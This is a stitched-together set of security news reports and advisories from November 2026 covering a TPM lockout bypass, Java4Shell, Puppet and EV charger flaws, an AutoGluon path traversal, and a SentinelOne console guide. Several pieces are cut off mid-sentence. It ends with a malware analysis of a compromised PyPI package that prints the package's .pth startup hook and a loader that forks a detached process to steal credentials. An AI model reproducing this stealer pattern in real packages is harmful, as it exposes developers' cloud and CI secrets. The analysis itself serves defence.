title: New Attack Bypasses TPM Lockout to Crack Windows Hello and BitLocker PINs in Days, Not Years
text:
New Attack Bypasses TPM Lockout to Crack Windows Hello and BitLocker PINs in Days, Not YearsSwati KhandelwalNov 18, 2026Hardware Security / Windows Security

//<![CDATA[
document.addEventListener("DOMContentLoaded",()=>{let t=document.querySelector("h1.story-title"),m=document.querySelector(".postmeta");t&&m&&t.insertAdjacentElement("afterend",m)})
//]]>

On AMD-based PCs and some Intel PCs, the TPM lockout for Windows Hello and BitLocker PINs can be reset by someone who opens the PC's case, researchers at Technische Universität Berlin say.

That leaves short PINs open to guessing. In lab tests, the researchers found a four-digit Hello PIN on an AMD laptop and a 6-digit BitLocker PIN on an Intel laptop this way.

Both PINs were set by the researchers and found within 236 tries. From the speeds they measured, they calculate a worst-case of 40 hours for a four-digit Hello PIN, compared to 69 days with the lockout working as documented. For a default six-digit BitLocker PIN, the worst-case time drops from 19 years to 20 days.

AMD confirmed yesterday that its processor firmware has a flaw that allows the attack on some PCs with its chips. It plans fixes for most of those chips between November and February 2027. For now, the researchers advise adding at least two digits to Hello and BitLocker PINs.

The TPM in these PCs is a firmware TPM, built into the processor. Unlike a separate TPM chip, it has no secure storage of its own, according to the research paper the researchers posted late last week. So it keeps its saved state, including the count of wrong guesses, encrypted on the mainboard's flash chip.

If someone copies that saved state and later writes the old copy back, the count goes back too, unless the PC detects it. Newer PCs try to catch this with counters inside the flash chip, called RPMC, that can only go up.

On AMD PCs that use these counters, the processor's firmware never verifies that a counter actually increased. A small board placed between the processor and the flash chip can block the update and report success, causing the PC to accept the old state.

RPMC chips from flash maker Winbond have a different weakness, the researchers found. A brief drop in the chip's power supply, called a voltage glitch, can cause the chip to reveal the secret key that signs its counter values. With that key, which took about a second to extract with their best settings, the board can forge any counter value.

On the Intel laptop they tested, one glitch was enough: the laptop's firmware feeds the chip the same value at every boot, so the leaked key kept working after each restart.

For the Hello test, the researchers attacked a locked HP OmniBook 3 with an AMD Ryzen AI 5 330 processor and a BitLocker-encrypted drive. Their setup typed PINs from 1000 upward and reached the correct one, 1235, after 236 tries in 57 minutes.

Windows still forced a restart after every 5 incorrect PIN attempts on that laptop, but no lockout delay was applied. Microsoft's lockout defaults lock the TPM after 32 wrong tries and forget one failure every 10 minutes.

The BitLocker test ran on a Framework Laptop 13 with an Intel Core Ultra 5 125H processor and Winbond flash. BitLocker's startup prompt adds no limit of its own, so each reset gave a fresh 32 tries. The setup found the PIN, 123457, after 236 tries in 6 minutes and 55 seconds.

In both tests, the researchers took the flash chip off the mainboard and wired in their own board. A script read the screen, typed PINs, and restarted the laptop through a KVM switch. They also changed firmware settings to slow each laptop's link to the flash chip, because their board could not keep up at full speed.

The researchers make two further claims that their tests did not cover. Either method could be used against either PIN. A recovered Hello PIN can also unlock keys tied to the device and enable Hello-based single sign-on at work, and, in some configurations, pass a multi-factor check.

The researchers […]

title: AI Pentesting Checklist for Web Apps: 15 Questions to Ask Before Choosing a Vendor
text:
AI Pentesting Checklist for Web Apps: 15 Questions to Ask Before Choosing a VendorThe Hacker NewsNov 18, 2026Penetration Testing / Artificial Intelligence

TL;DR

Attackers move first. On average, exploitation now starts before a patch exists (Mandiant M-Trends 2026). In 1H 2026, 23% of vulnerabilities VulnCheck added to its exploited list were hit on or before disclosure day.
AI pentesting vendors aren't interchangeable. Most look convincing in a demo. The gaps show up in your logged-in flows, your coverage, and your production safety.
Make them prove it on your own web apps. Score each vendor on context, reach, validated findings, guardrails, and retests.

Choosing an AI pentesting vendor? Get 15 questions, red flags, and a scorecard to test what vendors deliver, not just what they demo. Download the free checklist →

AI is speeding attackers up

For the first time, Google's Threat Intelligence Group identified a threat actor using a zero-day exploit it believes was developed with AI: a 2FA bypass rooted in a logic flaw that conventional fuzzing and static analysis can easily miss (GTIG).

Agentic pentesting can close that gap, and 87% of US security leaders surveyed are planning, piloting, or using it. Choosing the agent is the hard part.

Every Demo Looks Good. Your App Is the Real Test.

Picture three agents that all demo well. The first finds real flaws but stops at your login page. The second navigates your app but can't answer a basic question: coverage of what? The third exploits real issues but has no hard limits for production.

Each looks impressive on the vendor's target. The difference shows up on yours. A structured bake-off surfaces it before you sign.

Ask What the Agent Knows Before It Attacks

Every tester has to learn your site before the first payload. That recon is real attack work. The cost is redoing it from scratch on every engagement, when most of the map hasn't changed. In CyCognito's model, recon and analysis take 20 to 30 of a manual pentest's 63 to 95 hours.

Agents differ here. Some start from a blank URL and rebuild the map on every run. Others start from an existing model of your site and keep it current between runs. Ask which one you're buying, what carries over between runs, and whether the agent keeps discovering beyond its starting map. A starting map should be a head start, not a boundary.

Without context, an AI agent behaves like a smart scanner. With context, it can reason about your application. That changes what it finds, not just how fast. When a security researcher hunted for flaws in Apache Airflow, their AI assistant called the search a dead end. Testing how the deployment’s parts trust each other, instead of reading the code, turned up an unauthenticated RCE (CVE-2026-68982).

Ask for Proof, Not Suspicion

A suspicious pattern is not an exploitable vulnerability. Ask whether the agent exploits what it suspects, reproduces its findings, and hands over evidence your team can verify. A list of suspected issues is not a validated pentest.

Here is what proof looks like. During an authorized assessment of a major insurer's production website, an AI pentesting agent found that the one-time passcode request could send login codes to any email address. It proved the flaw by logging in with a code sent to its own inbox, and guardrails then stopped the test. The insurer said it had pentested the site about six months earlier (Reflectiz case study on The Hacker News).

Three Questions That Expose a Weak AI Pentesting Vendor

A demo can look convincing without proving that the agent reaches your logged-in workflows, validates what it finds, or confirms your fixes. Here are three of the 15 checks to run before you choose.

The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a critical security flaw impacting Perforce Puppet, an enterprise infrastructure-as-code (IaC) and configuration management platform, to its Known Exploited Vulnerabilities (KEV) catalog, citing reports of active exploitation.

The vulnerability, tracked as CVE-2026-115731 (CVSS score: 9.4), is a case of deserialization of untrusted data that could result in remote code execution.

"Perforce Puppet Enterprise contains a deserialization of untrusted data vulnerability in Puppet's report-processing code that allows a client with any CA-signed agent certificate to execute arbitrary code on the Puppet Server as the service user by submitting a report containing a crafted rich-data type through a PUT request," CISA said.

"If the certificate authority automatically signs requests without strong verification, an unauthenticated network attacker can obtain a valid certificate and exploit the vulnerability."

The shortcoming impacts the following versions -

Puppet Enterprise 2026.0.0 before 2026.0.1
Puppet Enterprise 2025.0.0 before 2025.12.1
Puppet Enterprise 2023.8.0 before 2023.8.13
Puppet Core 9.0.0 before 9.1.3
Puppet Core 8.x before 8.22.2

It was addressed by Perforce Software on November 3, 2026, in the following versions -

Puppet Enterprise 2026.0.1 (Puppet Core 9.1.3)
Puppet Enterprise 2025.12.1 (Puppet Core 8.22.2)
Puppet Enterprise 2023.8.13 (Puppet Core 8.22.2)
Puppet Core 9.1.3
Puppet Core 8.22.2

It's worth noting that the issue also affects OpenVox, an open-source implementation of Puppet, and has been resolved in the following versions -

OpenVox Agent 9.3.0 and 8.32.0
OpenVox Server 9.2.0 and 8.18.0

Alain Rödel, a security researcher at Neodyme AG, has been credited with discovering and reporting CVE-2026-115731 along with CVE-2026-115732 (CVSS score: 9.0), a critical certificate-name authorization bypass affecting both Puppet and OpenVox. The issues were discovered with artificial intelligence (AI) assistance and precise steering, the German cybersecurity company added.

"The impact highly depends on the Puppet server configuration and the orchestration protocols used, if any are enabled at all," Neodyme said in a report published this month. "Independent of the configuration, an attacker with RCE on a Puppet server can grab the CA signing keys and impersonate other hosts."

"Puppet is a powerful software, often with full access to a fleet of systems in a corporate network. Remote Code Execution on such a central and important system can lead to worst-case scenarios: Deployment of ransomware, mass data exfiltration, and potentially lateral movement to other parts of the network."

As of writing, there are no details on how the vulnerability is being weaponized in the wild. However, a Reddit user named transdimensia noted in a November 4 post that it was being exploited shortly after public disclosure.

"After finding a severely misconfigured CA in my fleet, I traced the actions backwards on a [CVE-2026-]115731 intrusion," the user said.

Federal Civilian Executive Branch (FCEB) agencies are advised to apply the fixes by December 1, 2026, to secure their networks under Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk.

title: CISA Urges Immediate Patching of Java4Shell Flaw That Could Allow Remote Code Execution
text:
CISA Urges Immediate Patching of Java4Shell Flaw That Could Allow Remote Code ExecutionRavie LakshmananNov 18, 2026Vulnerability / Enterprise Security

//<![CDATA[

//]]>

The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has urged organizations to immediately patch a newly disclosed critical security flaw impacting Oracle Java.

The flaw, tracked as CVE-2026-114938 (CVSS score: 8.1), refers to a case of out-of-bounds write that can lead to denial-of-service (DoS) or remote code execution under certain conditions.

"This critical memory-corruption vulnerability, known as 'Java4Shell,' affects the Base64 decoder of the x86-64 HotSpot Java Virtual Machine (JVM), which is part of the Java Development Kit (JDK)," CISA said. "Specially crafted Base64 input could crash the JVM and allow for unauthenticated remote code execution."

Patches for the flaw have been released by Oracle and OpenJDK. As of writing, there is no evidence the vulnerability has been exploited in the wild.

As reported previously by The Hacker News, Java4Shell can enable attackers without an account to execute arbitrary code on Keycloak, Atlassian Jira, Atlassian Confluence, JFrog Artifactory, Jenkins, and PingFederate, and with a login on Apache Kafka Broker, Apache Solr, Elasticsearch, Gerrit, and Spinnaker, under default settings.

Advisories for the flaw have been released by numerous security and software vendors, including Aikido, Amazon Linux, Blackpoint Cyber, Chainguard, Cisco Talos, Cycode, Datadog, Dynatrace, Endor Labs, Field Effect, Hadrian, Horizon3.ai, Miggo, Orca Security, Qualys, Rapid7, Red Hat, SentinelOne, Sophos, Tanium, Tenable, Upwind, VulnCheck, watchTowr, and Wiz.

In an update shared on November 18, 2026, the Keycloak team said an instance can be considered at risk if the following conditions apply -

It runs an unpatched OpenJDK build from 17.0.6 onward, including unpatched OpenJDK 21 and 25 builds
Its x86-64 host or virtual machine exposes the avx512vbmi CPU feature to Java
The running JVM has Base64 intrinsics enabled and has not been limited to AVX2 with -XX:UseAVX=2

"The x86-64 Keycloak container images tagged 26.8.2-1 and 26.8.2-2 bundle an affected OpenJDK 21.0.13 build," the team said. "These image tags alone do not establish whether your deployment is exploitable: check the CPU feature and effective JVM flags."

"A Keycloak ZIP or TAR.GZ distribution started directly on a host can also be affected; the conditions depend on its Java runtime and CPU, not on whether it runs in a container."

Keycloak is also recommending that users run the below command to check the CPU feature on a host or virtual machine -

grep -m1 '^flags' /proc/cpuinfo | grep -qw avx512vbmi && echo 'AVX-512 VBMI available'

If the output of the command returns nothing, it indicates that the CPU does not expose AVX-512 VBMI and is not known to be affected by the flaw. Keycloak has released temporary mitigations that users can apply until it releases updated Keycloak and Keycloak Operator container images once patched OpenJDK builds are available for them.

"The vulnerability could be reached through a local Spring Boot application using Spring Security," Blackpoint Cyber researchers Sam Decker and Nevan Beal said.

"In this environment, approximately 28,000 unauthenticated HTTP requests carrying a malformed Base64 authentication value caused the JVM to terminate after roughly 20 seconds of sustained requests. Additional testing confirmed corruption of nearby Java objects and changes to live application data without necessarily causing an immediate crash."

CISA is recommending that organizations take the following steps -

Identify affected Java installations.
Review software inventory for JDKs and Java runtimes, including those bundled with third-party […]

title: Java4Shell (CVE-2026-114938) Enables Pre-Auth RCE in Jira, Jenkins, Keycloak on Java 17+ AVX-512 VBMI Servers
text:
Java4Shell Flaw (CVE-2026-114938) Enables Pre-Auth RCE in Jira, Jenkins, Keycloak and MoreSwati KhandelwalNov 18, 2026Vulnerability / Software Security

//<![CDATA[
document.addEventListener("DOMContentLoaded",()=>{let t=document.querySelector("h1.story-title"),m=document.querySelector(".postmeta");t&&m&&t.insertAdjacentElement("afterend",m)})
//]]>

A Java flaw called Java4Shell can let attackers without an account run their own code on Jira, Jenkins, Keycloak, and three other widely used applications, says Calif, the security research firm that disclosed it this week.

The flaw is present in Java 17.0.6 and later, and the vulnerable code runs only on x86-64 Intel and AMD chips that support the AVX-512 VBMI feature.

Tracked as CVE-2026-114938, the fix was released today by Oracle and the OpenJDK project, whose open-source code underpins Java builds from many vendors. Amazon has fixed its Corretto Java builds, but Red Hat is still preparing fixes for its own.

The researchers are holding back their attack code for the six applications, and other labs have so far reproduced crashes and a memory leak but not the code execution. Canada's Cyber Center said this week that it was not aware of any attacks exploiting the flaw.

Servers often decode Base64-encoded data, such as HTTP Basic login headers, SAML artifacts, and CSRF tokens, before checking whether a user is logged in. That is how an attacker without an account can exploit the flaw.

The flaw is in a faster version of Java's Base64 decoder that runs on chips with AVX-512 VBMI. Java switches to it after compiling the decoder for speed, which it does for code that runs often.

A malformed string that ends with an extra = makes this decoder write 62 or 63 bytes past the end of its output. Java rejects the string, but only after the write.

The bytes written past the end are fixed, so an attacker controls only where they land. For that reason, early readings of the source code had pointed to a crash rather than code execution, as The Hacker News noted in an earlier report yesterday.

The attacks worked without a login under the default settings of Keycloak, Atlassian Jira, Atlassian Confluence, JFrog Artifactory, Jenkins, and PingFederate, and with a login on Apache Kafka Broker, Apache Solr, Elasticsearch, Gerrit, and Spinnaker, Calif says in its technical write-up. The researchers' lists are incomplete, and they rate the flaw as 9.2 out of 10 under CVSS 4.0.

They get past the fixed bytes by arranging the server's memory so that the overflow expands a neighboring array. They then use that array to write bytes of their choosing and a second array to read back from memory, a step they call JavaBleed. From there, the researchers say, the attack reaches the parts of Java that run code.

There is no single exploit that works everywhere. Each target requires its own memory layout and timing, and some attacks are sensitive to network delays.

A proxy that waits for complete requests, as nginx does by default, blocks some attacks but not all. A failed attempt can crash Java, and an attacker can often try again.

Security company Upwind reproduced the memory corruption on an AWS server with an Intel Ice Lake chip, where it damaged the next object in memory and eventually crashed Java, according to its lab results.

Blackpoint Cyber's Adversary Pursuit Group crashed a test Spring Boot application by sending about 28,300 malformed login requests over roughly 20 seconds, without ever logging in.

The group also used the JavaBleed step in a local test to read a secret stored next to the overflow, which worked in all 30 runs. It did not reproduce remote code execution, its test results show.

Oracle scores the flaw 8.1 out of 10 under CVSS 3.1, rating it hard to exploit but requiring no login. The description in its CVE record says, "Successful attacks of this vulnerability can result in takeover of Oracle Java SE."

Red Hat also rates it as requiring no login, with a preliminary score […]

title: ZDI-26-1037: (0Day) (Pwn2Own) United Chargers Grizzl-E Smart 40A OCPP Backend Configuration Authentication Bypass Vulnerability
text:

November 18th, 2026

ZDI-26-1037
ZDI-CAN-29063

CVE ID

7.6
AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L

Affected Vendors

United Chargers

Affected Products

Grizzl-E Smart 40A

Vulnerability Details
This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of United Chargers Grizzl-E Smart 40A EV chargers. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the handling of OCPP backend configuration requests. The issue results from the lack of authentication prior to allowing access to functionality. An attacker can leverage this in conjunction with other vulnerabilities to execute arbitrary code in the context of the device.
Additional Details

Since 04/14/26, ZDI has made multiple attempts to contact United Chargers to establish a vendor disclosure channel for the vulnerabilities identified in the Grizzl-E Smart 40A during Pwn2Own Automotive 2026. Despite these repeated efforts, both before and after the contest, the vendor has not responded to any communication.

-- Mitigation: Given the nature of the vulnerability, the only salient mitigation strategy is to restrict interaction with the product

Disclosure Timeline

06/17/26 - ZDI reported the vulnerability to the vendor07/03/26 - ZDI asked for updates08/28/26 - ZDI asked for updates09/15/26 - the vendor closed the report as a false positive10/26/26 - ZDI disputed the vendor's closure as the existing fix was incomplete10/29/26 - the vendor reopened the report agreeing the mitigation wasn't enough10/30/26 - ZDI asked for the fix plan11/04/26 - ZDI notified the vendor of the intention to publish the case as a 0-day advisory on 11/18/2611/13/26 - the vendor stated it planned to ship a fix and issue a GHSA before the 11/18 deadline11/16/26 - ZDI asked the vendor to confirm whether the fix/GHSA had shipped11/17/26 - the vendor clarified no separate patch is coming, and disputed that the report describes a vulnerability11/17/26 - ZDI confirmed the zero-day advisory would publish on 11/18/26

CVE-2026-130638 - Path traversal in the object detection dataset preparation tool in AutoGluon MultiModal

Bulletin ID: 2026-188-AWS
Scope: AWS
Content Type: Important (requires attention)
Publication Date: 11/18/2026 10:00 AM PST

Description:

AutoGluon is an open source machine learning framework maintained by AWS.

We identified CVE-2026-130638, an issue in the object detection dataset preparation tool in AutoGluon MultiModal before 1.6.0. The tool downloaded dataset archives over plaintext HTTP and extracted them without validating the archive members. An actor with an on-path network position could substitute a crafted archive and write files outside the intended output directory with the privileges of the user running the tool. This tool is an optional command-line utility for downloading public benchmark datasets. The AutoGluon Multimodal training and inference APIs, including object detection with MultiModalPredictor, do not use it and are not affected.

Impacted versions: < 1.6.0

Resolution:

This issue has been addressed in autogluon.multimodal version 1.6.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.

Workarounds:

If you cannot upgrade, do not run the prepare_detection_dataset utility. Instead, download the datasets directly from their official sources over HTTPS and extract them with a tool that rejects absolute paths and .. members, such as Python's tarfile with filter="data".

References:

CVE-2026-130638
GHSA-cx2g-xwj2-2vxm

Acknowledgement:

We would like to thank sondt99 for collaborating on this issue through the coordinated vulnerability disclosure process.

Please email aws-security@amazon.com with any s ecurity questions or concerns.

title: SentinelOne Singularity Operations Center - Vulnerabilities, Risk Scores and Findings
text: Now, vulnerabilities and application scanning. I have touched this before in the older console, and I am not going to write it all again. If you want the fundamentals, go here first:https://www.cyberengage.org/post/sentinelone-p6-ispm-application-management-a-practical-guide-an-practical-trainingRead that one and come back. This article is only about what changed.And I will say it straight away, because in previous I was complaining the whole time: this one is actually good. There is a lot more here than the old console had, and most of it I like. So let us start with the thing that I think matters most. You can finally run a scan when you want toRemember the old console? You scheduled the scan. That was it. Wednesday, 10:30 AM PST, every week, and that was your lot. If someone asked you on Thursday afternoon whether a machine got patched, you either waited a week or you went and looked at the endpoint yourself.Now there is an on-demand scan. You click Scan Now and it goes.I know, it sounds small. It is not. Think about why vulnerability data was never actually useful before — it was always old and you could not refresh it. Now you push a patch, you scan, you know the same day. That is a real difference in how you work, not a feature bullet.A few things to keep in mind:You cannot run another manual scan for 8 hours. So do not plan to sit there re-scanning every twenty minutes watching a rollout. Run one scan at the end of your window, not five during it.Scheduled and manual scans run in parallel, so the cooldown does not interfere with your weekly schedule.After the scan finishes, the inventory still takes a few hours to populate. Scan complete does not mean data is there. Do not panic in the first hour.Now where do you actually find thisThis is the part that annoyed me. It is not on the Vulnerabilities page, which is where you will look first. It is here:Policies and settings → Exposure Management → Application & OS VulnerabilityThere is a Manage scan settings link from Inventory → Applications as well (S-25.2.6), and honestly that is how most people find it, by accident.Three things on that page you need to know:Scanning is off by default from Platform version X SP1. Both automated and manual. So if you are staring at an empty Vulnerabilities page wondering what is broken — nothing is broken, it was never switched on. Go and check yours right now, I will wait.Settings are scope-based with inheritance. You will see Policy is inherited from a higher scope or Policy no longer inherited. Edit Policy breaks it, Inherit Policy gives it back.The main toggle got renamed to Application & OS Vulnerability Management. It used to be Singularity Vulnerability Management. Same switch, do not go hunting for the old name.And here is something worth stopping on, because it will catch you. Inheritance here flows downward — parent to child, until a child refuses it. In Previous console, the automatic alert action rules worked the opposite way: site beats account beats global. Same console, two features, two completely different mental models. Lovely.On scheduling, since you can still do it. Before S-24.3.6 everyone got Wednesday 10:30 AM PST. Now the default is whenever you happened to click the toggle, and you set your own under Scan Execution Schedule — how often in weeks, which day, what time. Set it properly. Otherwise you will discover you are scanning the whole estate at 2 PM on a Tuesday, and someone will ask you why.Basic, Extensive, and the add-on — this is three things, not twoRight, this is where everyone gets confused, including me the first time. There are two scan types and one separate licence, and they are not the same conversation.Basic Vulnerability Scan — you get this with Control or Complete. Windows and macOS applications and their vulnerabilities. From S-26.3.1 it also does macOS OS-level detection, but that bit needs the add-on.Extensive Vulnerability Scan — needs Singularity Vulnerability Management. This is what gets […]

title: We caught the agent-framework PyPI compromise six minutes after it published
text:
Skip to main content Threat CommandWe caught the agent-framework PyPI compromise six minutes after it publishedVersions 1.26.1 and 1.26.2 stole Azure, Azure DevOps and GitHub Actions tokens from a .pth hook that ran on every Python launch, so if either one touched a build agent or a laptop, assume every secret on that host is gone.November 18, 2026Elastic Security LabsMalware AnalysisThreat IntelligenceJump to Share The compromise, and how we detected it
Microsoft’s Agent Framework is an open-source, multi-language framework used to build and orchestrate AI agents within the Microsoft Azure ecosystem. The compromised package is the meta-package, a thin wrapper used to pull in the different framework dependencies. The agent-framework averages 196,000 downloads a month across all versions. If versions 1.26.1 or 1.26.2 touched a build agent or a laptop, assume every secret on that host is gone, and pin back to 1.26.0.
agent-framework 1.26.1 went live on PyPI at 20:35 UTC on November 17, 2026. Our supply-chain monitor flagged it as malicious at 20:41 UTC, and we published the details that evening. Version 1.26.2 followed at 21:08 UTC with the same stealer under new filenames. PyPI removed both within the hour.
Both versions shipped a .pth startup hook (a plain-text configuration file processed automatically by Python's site module every time the interpreter starts up), so the credential stealer ran every time Python started on the host. Importing the package was never necessary. It read environment variables from up to 300 running processes, Azure CLI token caches, and pip, npm, Docker, git, and Hugging Face credentials, then called Azure DevOps and GitHub Actions OIDC endpoints and the Azure Instance Metadata Service to mint fresh cloud tokens. Those tokens are how a compromised build can reach the Azure subscription behind it. Everything collected went to a single webhook[.]site endpoint, zlib-compressed and Base64-encoded.

How the agent-framework .pth hook triggers the stealer (1.26.1)
The attacker added two new files (agent_framework_meta.pth, _telemetry.py) and modified one file (__init__.py) in the 1.26.1 compromised package.
The attack is triggered by the .pth hook based on the following single line:
import agent_framework_meta
Every time Python starts, its site module processes any .pth files in the site-packages directory. Any line in these files that begins with import is executed as code, before the user’s script or any other code runs.
This import executes the package’s __init__.py, which contains a loader appended to the end of the file that imports _telemetry.py and calls its _start() function.
# Lightweight runtime diagnostics hook.try: from . import _telemetry as _telemetry _telemetry._start()except Exception: pass
The _start() function uses an environment variable, _AF_TEL, to avoid running more than once per process tree, then forks a child process and detaches it with setsid(). The child collects secrets and POSTs them to webhook[.]site while the parent continues normally, so the theft adds no visible delay. On Windows, where fork() isn’t available, it runs the collection in a background thread instead.
def _start(): if os.environ.get("_AF_TEL"): return os.environ["_AF_TEL"] = "1" try: if hasattr(os, "fork"): pid = os.fork() if pid == 0: try: os.setsid() except Exception: pass _run() os._exit(0) return except Exception: pass try: import threading t = threading.Thread(target=_run) t.daemon = True t.start() except Exception: pass
What the agent-framework credential stealer collects
Environment variables from the host and running processes
The credential stealer collects environment variables whose names contain the following strings:
